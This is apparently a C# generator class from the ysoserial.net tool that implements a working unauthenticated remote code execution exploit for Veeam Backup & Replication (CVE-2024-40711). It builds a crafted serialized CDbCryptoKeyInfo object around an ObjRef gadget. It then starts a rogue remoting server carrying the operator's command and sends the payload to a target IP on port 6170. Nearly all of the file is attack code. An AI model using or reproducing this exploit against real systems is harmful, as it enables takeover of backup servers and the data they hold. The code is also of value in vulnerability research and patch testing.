using Newtonsoft.Json.Linq;
using Polenter.Serialization.Core;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Veeam.Backup.Core;
using Veeam.Backup.Model;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    public class VeeamGenerator : GenericGenerator
    {
        public override string Finders()
        {
            return "friday the 13th";
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {

            string banner = @"


                 __         .__  ___________                    
__  _  _______ _/  |_  ____ |  |_\__    ___/_____  _  _________ 
\ \/ \/ /\__  \\   __\/ ___\|  |  \|    | /  _ \ \/ \/ /\_  __ \
 \     /  / __ \|  | \  \___|   Y  \    |(  <_> )     /  |  | \/
  \/\_/  (____  /__|  \___  >___|  /____| \____/ \/\_/   |__|   
              \/          \/     \/                             
";

            string banner2 = @"
        (*) Veeam Backup & Replication Unauthenticated Remote Code Execution Exploit (CVE-2024-40711)
          - Vulnerability Discovered by Florian Hauser (@frycos) at CODE WHITE Gmbh (@codewhitesec)
          - Exploit Written by Sina Kheirkhah (@SinSinology) at watchTowr
          - Thank you to my dear friend Soroush Dalili (@irsdl) for his help

        CVEs: [CVE-2024-40711]  
";
            Console.WriteLine(banner);
            Console.WriteLine(banner2);

            string tool_path_ExploitRemoting = @".\ExploitRemotingService\ExploitRemotingService.exe";

            string tool_path_RogueRemoting = @".\RogueRemotingServer\RogueRemotingServer.exe";


            string rogueremoting_payload_filename = @"exploit.soapformatter";

            if (!File.Exists(tool_path_ExploitRemoting))
            {
       
                Console.WriteLine($"[!] Following tool needs to be present {tool_path_ExploitRemoting}");
                System.Environment.Exit(1);
            }
            if (!File.Exists(tool_path_RogueRemoting))
            {
                Console.WriteLine($"[!] Following tool needs to be present {tool_path_RogueRemoting}");

                System.Environment.Exit(1);
            }
            if (!File.Exists(rogueremoting_payload_filename))
            {
                Console.WriteLine($"[!] required payload is not present");
             
                System.Environment.Exit(1);
            }


            ObjRefGenerator gen = new ObjRefGenerator();

         
            CDbCryptoKeyInfoWrapper payload =  new CDbCryptoKeyInfoWrapper(new string[] { Convert.ToBase64String((byte[])gen.Generate(formatter, inputArgs) ) });

            ProcessStartInfo rogueRemoting = new ProcessStartInfo
            {
                FileName = tool_path_RogueRemoting,
                Arguments = @"--wrapSoapPayload " + inputArgs.Cmd + " " + rogueremoting_payload_filename,
                UseShellExecute = false,
                CreateNoWindow = false
            };
            Process.Start(rogueRemoting);


            ProcessStartInfo exploitRemoting = new ProcessStartInfo
            {
                FileName = tool_path_ExploitRemoting,
				
				// I know
                Arguments = @"-s tcp://" + inputArgs.TargetVeeamIP + @":6170/PermanentSessionService raw " + Convert.ToBase64String((byte[])Serialize(payload, formatter, inputArgs)),
				
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };


            Process.Start(exploitRemoting);

            System.Environment.Exit(1); 

            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("soapformatter", StringComparison.OrdinalIgnoreCase))
            {
                return Serialize(payload, formatter, inputArgs);
            }
            else
            {
                throw new Exception("Formatter not supported");
            }


        }

        public override string Name()
        {
            return "Veeam";
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "SoapFormatter", "ObjectStateFormatter", "LosFormatter" };
        }




        [Serializable]
        public class CDbCryptoKeyInfoWrapper : ISerializable
        {
            private string[] _fakeList;

            public CDbCryptoKeyInfoWrapper(string[] _fakeList)
            {
                this._fakeList = _fakeList;
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
             


                info.SetType(typeof(CDbCryptoKeyInfo));
                info.AddValue("Id", Guid.NewGuid());
                info.AddValue("KeySetId", null);
                info.AddValue("KeyType", 1);
                info.AddValue("Hint", "aaaaa");
                info.AddValue("DecryptedKeyValue", "AAAA");
                info.AddValue("LocaleLCID", 0x409);
                info.AddValue("ModificationDateUtc", new DateTime());
                info.AddValue("CryptoAlg", 1);
                info.AddValue("RepairRecs", _fakeList);



            }
        }


    }
}
